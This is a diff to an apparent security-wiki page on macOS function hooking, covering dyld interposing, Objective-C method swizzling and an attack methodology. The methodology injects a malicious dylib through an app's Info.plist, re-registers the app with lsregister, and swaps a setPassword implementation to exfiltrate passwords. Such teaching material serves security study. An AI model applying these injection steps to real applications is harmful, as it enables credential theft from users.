@@ -1,6 +1,5 @@
 # macOS Function Hooking
 
-
 ## Function Interposing
 
 Create a **dylib** with an **`__interpose` (`__DATA___interpose`)** section (or a section flagged with **`S_INTERPOSING`**) containing tuples of **function pointers** that refer to the **original** and the **replacement** functions.
@@ -29,7 +28,6 @@ int my_printf(const char *format, ...) {
 __attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
 __attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
 ```
-```
 
 **hello.c**
 
@@ -41,7 +39,6 @@ int main() {
     printf("Hello World!\n");
     return 0;
 }
-```
 ```
 
 **interpose2.c**
@@ -69,8 +66,6 @@ int my_printf(const char *format, ...)
 
 DYLD_INTERPOSE(my_printf,printf);
 ```
-```
-
 
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
@@ -79,7 +74,7 @@ Hello from interpose
 DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
 Hello from interpose
 ```
-```
+
 > [!WARNING]
 > The **`DYLD_PRINT_INTERPOSTING`** env variable can be used to debug interposing and will print the interpose process.
 
@@ -99,7 +94,7 @@ struct dyld_interpose_tuple {
 extern void dyld_dynamic_interpose(const struct mach_header* mh,
         const struct dyld_interpose_tuple array[], size_t count);
 ```
-```
+
 ## Method Swizzling
 
 In ObjectiveC this is how a method is called like: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
@@ -182,7 +177,7 @@ int main() {
     return 0;
 }
 ```
-```
+
 ### Method Swizzling with method_exchangeImplementations
 
 The function **`method_exchangeImplementations`** allows to **change** the **address** of the **implementation** of **one function for the other**.
@@ -195,6 +190,7 @@ The function **`method_exchangeImplementations`** allows to **change** the **add
 
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
+
 
 // Create a new category for NSString with the method to execute
 @interface NSString (SwizzleString)
@@ -232,7 +228,7 @@ int main(int argc, const char * argv[]) {
     return 0;
 }
 ```
-```
+
 > [!WARNING]
 > In this case if the **implementation code of the legit** method **verifies** the **method** **name** it could **detect** this swizzling and prevent it from running.
 >
@@ -295,12 +291,12 @@ int main(int argc, const char * argv[]) {
     }
 }
 ```
-```
+
 ## Hooking Attack Methodology
 
 In this page different ways to hook functions were discussed. However, they involved **running code inside the process to attack**.
 
-In order to do that the easiest technique to use is to inject a [[macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md|Dyld via environment variables or hijacking]]. However, I guess this could also be done via [[macos-ipc-inter-process-communication/README.md#Dylib Process Injection Via Task Port|Dylib process injection]].
+In order to do that the easiest technique to use is to inject a [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). However, I guess this could also be done via [[macos-ipc-inter-process-communication/README.md#Dylib Process Injection Via Task Port|Dylib process injection]].
 
 However, both options are **limited** to **unprotected** binaries/processes. Check each technique to learn more about the limitations.
 
@@ -309,19 +305,19 @@ However, a function hooking attack is very specific, an attacker will do this to
 So the attacker vector would be to either find a vulnerability or strip the signature of the application, inject the **`DYLD_INSERT_LIBRARIES`** env variable through the Info.plist of the application adding something like:
 
 ```xml
-LSEnvironment
+<key>LSEnvironment</key>
 <dict>
-    DYLD\_INSERT\_LIBRARIES
-    /Applications/Application.app/Contents/malicious.dylib
+    <key>DYLD_INSERT_LIBRARIES</key>
+    <string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
-```
+
 and then **re-register** the application:
 
 ```bash
 /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
 ```
-```
+
 Add in that library the hooking code to exfiltrate the information: Passwords, messages...
 
 > [!CAUTION]
@@ -364,10 +360,8 @@ static void customConstructor(int argc, const char **argv) {
     real_setPassword = method_setImplementation(real_Method, fake_IMP);
 }
 ```
-```
+
 ## References
 
-- [[https://nshipster.com/method-swizzling/|https://nshipster.com/method-swizzling/]]
-
-
+- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
 
